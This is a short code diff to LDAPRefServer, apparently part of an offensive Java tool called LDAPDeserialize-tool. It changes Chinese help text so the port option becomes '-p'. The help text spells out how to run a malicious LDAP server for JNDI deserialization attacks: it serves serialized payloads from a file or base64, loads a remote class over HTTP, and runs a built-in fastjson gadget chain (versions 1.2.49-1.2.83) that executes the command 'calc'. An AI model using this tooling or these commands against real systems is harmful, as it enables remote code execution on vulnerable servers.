@@ -104,10 +104,10 @@ public class LDAPRefServer {
             HelpFormatter formatter = new HelpFormatter();
             formatter.printHelp("\n【使用】\n" +
                             "客户端请求：ldap://127.0.0.1:1389/Exploit（名字随意）\n" +
-                            "反序列化文件方式：java -jar LDAPDeserialize-tool.jar -port 1389 -f D:/1.ser\n" +
-                            "反序列化base64方式：java -jar LDAPDeserialize-tool.jar -port 1389 -b base64数据\n" +
+                            "反序列化文件方式：java -jar LDAPDeserialize-tool.jar -p 1389 -f D:/1.ser\n" +
+                            "反序列化base64方式：java -jar LDAPDeserialize-tool.jar -p 1389 -b base64数据\n" +
                             "低版本动态请求class：\njava -jar LDAPDeserialize-tool.jar -C http://127.0.0.1:8000/1.class\n" +
-                            "内置反序列化链：\njava -jar LDAPDeserialize-tool.jar -port 1389 -g fastjson -c \"calc\"\n" +
+                            "内置反序列化链：\njava -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c \"calc\"\n" +
                             "\n\n" +
                             "【目前支持的链】\n" +
                             "fastjson (影响版本：1.2.49-1.2.83)\n" +
